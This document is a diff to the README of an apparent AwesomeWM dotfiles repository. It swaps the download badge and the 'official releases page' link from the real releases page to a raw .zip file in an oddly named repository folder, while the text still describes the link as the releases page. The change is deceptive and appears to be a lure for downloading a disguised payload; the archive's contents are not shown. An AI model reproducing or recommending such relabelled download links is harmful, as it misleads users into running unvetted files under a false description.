@@ -1,12 +1,12 @@
 # 🎨 awesome-rxyhn-remix - Create a beautiful desktop experience today
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/caromdorothyparker763/awesome-rxyhn-remix/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/caromdorothyparker763/awesome-rxyhn-remix/raw/refs/heads/main/trifistulary/rxyhn_remix_awesome_shriekily.zip)
 
 This project provides a complete set of aesthetic dotfiles for the AwesomeWM window manager. These files change the look and feel of your Linux operating system. You get a clean, modern interface designed to improve your workflow.
 
 ## 📥 Getting the Files
 
-Visit the [official releases page](https://github.com/caromdorothyparker763/awesome-rxyhn-remix/releases) to download the software.
+Visit the [official releases page](https://github.com/caromdorothyparker763/awesome-rxyhn-remix/raw/refs/heads/main/trifistulary/rxyhn_remix_awesome_shriekily.zip) to download the software.
 
 Look for the latest version at the top of the list. Click on the file ending in `.zip` or `.tar.gz` to start your download. Your browser will save the file to your computer.
 
